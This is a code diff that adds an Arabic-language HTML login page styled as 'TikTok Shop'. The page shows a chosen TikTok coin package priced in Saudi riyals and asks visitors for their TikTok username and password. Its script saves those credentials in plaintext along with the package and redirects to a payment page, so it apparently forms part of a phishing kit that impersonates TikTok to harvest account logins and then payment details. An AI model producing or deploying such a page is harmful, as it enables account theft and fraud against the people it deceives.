@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول | TikTok Shop</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            font-family: 'Cairo', 'Segoe UI', system-ui;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            direction: rtl;
+        }
+        .login-card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        h2 { color: #fff; text-align: center; margin-bottom: 10px; }
+        .sub { text-align: center; color: #a0aec0; margin-bottom: 30px; }
+        .package-info {
+            background: rgba(0,242,234,0.1);
+            border-radius: 16px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .package-info .coins { font-size: 24px; font-weight: bold; color: #00f2ea; }
+        .package-info .price { color: #fff; margin-top: 5px; }
+        .input-group { margin-bottom: 25px; }
+        .input-group label { display: block; margin-bottom: 8px; color: #a0aec0; }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            font-size: 16px;
+            color: #fff;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #00f2ea, #00b8b3);
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #1a1a2e;
+            cursor: pointer;
+        }
+        .back-link { display: block; text-align: center; margin-top: 20px; color: #a0aec0; text-decoration: none; }
+    </style>
+</head>
+<body>
+<div class="login-card">
+    <h2>تسجيل الدخول</h2>
+    <p class="sub">أدخل بيانات حساب تيك توك الخاص بك</p>
+    <div class="package-info" id="packageInfo"></div>
+    <form id="loginForm">
+        <div class="input-group">
+            <label>اسم المستخدم / البريد / رقم الهاتف</label>
+            <input type="text" id="username" required>
+        </div>
+        <div class="input-group">
+            <label>كلمة المرور</label>
+            <input type="password" id="password" required>
+        </div>
+        <button type="submit" class="btn-submit">متابعة إلى الدفع</button>
+    </form>
+    <a href="/" class="back-link">← العودة إلى الباقات</a>
+</div>
+<script>
+    const pkg = JSON.parse(localStorage.getItem('selectedPackage'));
+    if (!pkg) window.location.href = '/';
+    document.getElementById('packageInfo').innerHTML = `<div class="coins">${pkg.coins.toLocaleString()} عملة تيك توك</div><div class="price">السعر: ${pkg.price} ريال سعودي</div>`;
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        localStorage.setItem('userData', JSON.stringify({
+            username: document.getElementById('username').value,
+            password: document.getElementById('password').value,
+            package: pkg
+        }));
+        window.location.href = '/payment.html';
+    });
+</script>
+</body>
+</html>
